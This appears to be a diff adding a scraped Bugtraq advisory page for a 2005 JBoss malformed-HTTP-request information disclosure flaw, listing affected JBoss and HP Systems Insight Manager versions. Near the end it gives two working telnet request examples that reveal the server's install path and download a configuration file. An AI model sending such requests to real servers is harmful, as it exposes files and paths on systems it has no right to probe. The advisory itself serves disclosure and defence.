@@ -1,0 +1,129 @@
+#SpeeDr00t@Black Falcon<br>#bid13985<p><b><span style="font-size: 18pt;">JBoss Malformed HTTP Request Remote Information Disclosure Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/13985/info">info</a><br><a href="http://www.securityfocus.com/bid/13985/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/13985/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/13985/solution">solution</a><br><a href="http://www.securityfocus.com/bid/13985/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				13985
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Input Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+				
+					CVE-2005-2006<br/>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Jun 17 2005 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Jun 13 2008 11:22PM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				Discovery of this issue is credited to Marc Schoenefeld &lt;marc.schoenefeld@gmx.org&gt;.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					JBoss Group JBoss 4.0.2 <br/>
+					
+				
+					JBoss Group JBoss 3.2.7 <br/>
+					
+				
+					JBoss Group JBoss 3.2.5 <br/>
+					
+				
+					JBoss Group JBoss 3.2.2 <br/>
+					
+				
+					JBoss Group JBoss 3.2.1 <br/>
+					
+				
+					JBoss Group JBoss 3.0.8 <br/>
+					
+				
+					HP Systems Insight Manager  5.0 SP3<br/>
+					
+				
+					HP Systems Insight Manager  5.0 SP2<br/>
+					
+				
+					HP Systems Insight Manager  5.0 SP1<br/>
+					
+				
+					HP Systems Insight Manager  5.0<br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+				
+					JBoss Group JBoss 4.0.3 <br/>
+					
+				
+					JBoss Group JBoss 3.2.8 <br/>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	No exploit is required, the following examples are available:<br/><br/>Example 1 (Installation path disclosure): 3.2.x and 4.0.2<br/>Request:<br/>&amp;gt;&amp;gt;telnet jbosshost 8083<br/>&amp;gt;&amp;gt;GET %. HTTP/1.0<br/><br/>Reply:<br/>HTTP/1.0 400 C:\Programme\jboss-4.0.2\server\default\conf (Zugriff<br/>verweigert)<br/>Content-Type: text/html<br/><br/>Example 2 (Config file download): 4.0.2<br/>Request:<br/>&amp;gt;&amp;gt;telnet jbosshost 8083<br/>&amp;gt;&amp;gt;GET %server.policy  HTTP/1.0
+	
+		<ul>
+</ul>
+</div>
